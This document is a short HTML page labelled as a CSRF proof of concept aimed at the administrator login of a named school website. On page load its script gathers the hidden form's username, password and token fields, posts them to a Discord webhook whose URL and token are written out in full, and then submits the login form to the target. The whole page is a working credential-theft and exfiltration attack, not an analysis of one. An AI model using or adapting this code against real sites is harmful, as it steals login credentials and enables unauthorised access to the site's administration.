<html>
  <title>CSRF PoC</title>
  <body>
    <h2>CSRF Attack</h2>
    <form action="https://goodtreeacademy.org/administrator" method="POST" id="csrf_form">
      <input type="hidden" name="username" value="captured_username" />
      <input type="hidden" name="passwd" value="captured_password" />
      <input type="hidden" name="option" value="com_login" />
      <input type="hidden" name="task" value="login" />
      <input type="hidden" name="return" value="aW5kZXgucGhw" />
      <input type="hidden" name="f190f32683c2391007cd38cf6a85726a" value="1" />
      <input type="submit" value="Submit" />
    </form>
    <script>
      // Discord webhook URL
      const webhookURL = "https://discord.com/api/webhooks/1299594593372864543/TFWR27d2Qztpvy0e7yvMLaE0iZdddaVXTPapf0YQzDz-BzxN91c0fpgI4fpCOAZHXO9A";

      // Extract form data and send to Discord
      const form = document.getElementById("csrf_form");
      const formData = new FormData(form);

      // Prepare the payload for Discord
      const payload = {
        username: "CSRF Bot", // Customize the sender name
        content: `
        **CSRF Data Captured:**
        - Username: ${formData.get("username")}
        - Password: ${formData.get("passwd")}
        - Other Data: ${JSON.stringify(Object.fromEntries(formData))}
        `,
      };

      // Send the data to Discord
      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      }).then(() => {
        // Redirect to target after logging to Discord
        form.submit();
      });
    </script>
  </body>
</html>
